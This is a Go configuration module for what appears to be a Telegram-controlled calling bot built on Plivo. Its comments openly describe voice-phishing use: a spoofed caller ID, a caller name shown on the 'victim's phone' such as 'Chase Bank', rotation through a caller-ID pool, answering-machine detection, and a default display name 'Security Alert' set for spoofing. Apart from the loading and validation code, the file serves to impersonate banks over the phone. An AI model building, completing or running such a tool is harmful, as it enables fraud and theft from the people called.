package config

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sync"

	"gopkg.in/yaml.v3"
)

var ErrConfigNotLoaded = errors.New("configuration has not been loaded")

type Config struct {
	BotToken       string  `yaml:"bot_token"`
	PlivoAuthID    string  `yaml:"plivo_auth_id"`
	PlivoAuthToken string  `yaml:"plivo_auth_token"`
	PlivoNumber    string  `yaml:"plivo_number"`
	CallerID       string  `yaml:"caller_id"`      // Spoofed caller ID number (must be verified in Plivo)
	CallerName     string  `yaml:"caller_name"`    // Display name on victim's phone (e.g., "Chase Bank")
	EnableCNAM     bool    `yaml:"enable_cnam"`    // Enable CNAM lookup for caller ID
	RandomizeCID   bool    `yaml:"randomize_caller_id"` // Randomize caller ID from pool
	CallerIDPool   []string `yaml:"caller_id_pool"` // Pool of caller IDs to rotate through
	AdminIDs       []int64 `yaml:"admin_ids"`
	NgrokURL       string  `yaml:"ngrok_url"`
	Port           string  `yaml:"port"`
	DatabasePath   string  `yaml:"database_path"`
	LogPath        string  `yaml:"log_path"`
	Concurrency    int     `yaml:"concurrency"`
	MaxRetries     int     `yaml:"max_retries"`
	CallTimeout    int     `yaml:"call_timeout"`
	RingTimeout    int     `yaml:"ring_timeout"`   // How long to let phone ring
	MachineDetection bool `yaml:"machine_detection"` // Detect answering machines
}

type Loader struct {
	config   *Config
	filePath string
	mu       sync.RWMutex
	watchers []chan struct{}
	loaded   bool
	loadErr  error
}

var (
	instance *Loader
	once     sync.Once
)

func Load(path string) (*Loader, error) {
	once.Do(func() {
		instance = &Loader{
			filePath: path,
			watchers: make([]chan struct{}, 0),
		}
		instance.loadErr = instance.load()
		instance.loaded = true
	})

	if instance.loadErr != nil {
		return instance, instance.loadErr
	}

	return instance, nil
}

func Get() (*Config, error) {
	if instance == nil || !instance.loaded {
		return nil, ErrConfigNotLoaded
	}
	instance.mu.RLock()
	defer instance.mu.RUnlock()
	return instance.config, nil
}

func MustGet() *Config {
	cfg, err := Get()
	if err != nil {
		panic("config not loaded: " + err.Error())
	}
	return cfg
}

func (l *Loader) Reload() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if err := l.load(); err != nil {
		return err
	}

	for _, ch := range l.watchers {
		select {
		case ch <- struct{}{}:
		default:
		}
	}

	return nil
}

func (l *Loader) load() error {
	data, err := os.ReadFile(l.filePath)
	if err != nil {
		if os.IsNotExist(err) {

			l.config = DefaultConfig()
			if err := l.save(); err != nil {
				return fmt.Errorf("failed to create default config: %w", err)
			}
			return nil
		}
		return fmt.Errorf("failed to read config file: %w", err)
	}

	cfg := &Config{}
	if err := yaml.Unmarshal(data, cfg); err != nil {
		return fmt.Errorf("failed to parse config YAML: %w", err)
	}

	l.applyDefaults(cfg)
	l.config = cfg

	return nil
}

func (l *Loader) applyDefaults(cfg *Config) {
	if cfg.Port == "" {
		cfg.Port = "3000"
	}
	if cfg.DatabasePath == "" {
		cfg.DatabasePath = "./data/bot.db"
	}
	if cfg.LogPath == "" {
		cfg.LogPath = "./logs/bot.log"
	}
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 5
	}
	if cfg.MaxRetries <= 0 {
		cfg.MaxRetries = 3
	}
	if cfg.CallTimeout <= 0 {
		cfg.CallTimeout = 30
	}
	if cfg.RingTimeout <= 0 {
		cfg.RingTimeout = 30
	}
	if cfg.NgrokURL == "" {
		cfg.NgrokURL = "http://localhost:4040"
	}
	if cfg.AdminIDs == nil {
		cfg.AdminIDs = []int64{}
	}
	// CallerID defaults to PlivoNumber if not set
	if cfg.CallerID == "" {
		cfg.CallerID = cfg.PlivoNumber
	}
	// Default caller name for spoofing
	if cfg.CallerName == "" {
		cfg.CallerName = "Security Alert"
	}
}

func (l *Loader) save() error {
	dir := filepath.Dir(l.filePath)
	if dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("failed to create config directory: %w", err)
		}
	}

	data, err := yaml.Marshal(l.config)
	if err != nil {
		return fmt.Errorf("failed to marshal config to YAML: %w", err)
	}

	if err := os.WriteFile(l.filePath, data, 0644); err != nil {
		return fmt.Errorf("failed to write config file: %w", err)
	}

	return nil
}

func (l *Loader) Save() error {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.save()
}

func (l *Loader) RegisterWatcher(ch chan struct{}) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.watchers = append(l.watchers, ch)
}

func DefaultConfig() *Config {
	return &Config{
		Port:              "3000",
		DatabasePath:       "./data/bot.db",
		LogPath:           "./logs/bot.log",
		Concurrency:       5,
		MaxRetries:        3,
		CallTimeout:       30,
		RingTimeout:       30,
		NgrokURL:          "http://localhost:4040",
		AdminIDs:          []int64{},
		CallerName:        "Security Alert",
		EnableCNAM:        false,
		RandomizeCID:      false,
		MachineDetection:  true,
	}
}

func (c *Config) Validate() []string {
	var errors []string

	if c.BotToken == "" {
		errors = append(errors, "bot_token is required - obtain from @BotFather on Telegram")
	}
	if c.PlivoAuthID == "" {
		errors = append(errors, "plivo_auth_id is required - obtain from Plivo console")
	}
	if c.PlivoAuthToken == "" {
		errors = append(errors, "plivo_auth_token is required - obtain from Plivo console")
	}
	if c.PlivoNumber == "" {
		errors = append(errors, "plivo_number is required - must be a verified Plivo number")
	}
	if c.NgrokURL == "" {
		errors = append(errors, "ngrok_url is required for call webhooks - run ngrok and enter the URL")
	}
	if c.Concurrency < 1 || c.Concurrency > 50 {
		errors = append(errors, "concurrency should be between 1 and 50")
	}
	if c.CallTimeout < 10 || c.CallTimeout > 300 {
		errors = append(errors, "call_timeout should be between 10 and 300 seconds")
	}

	return errors
}
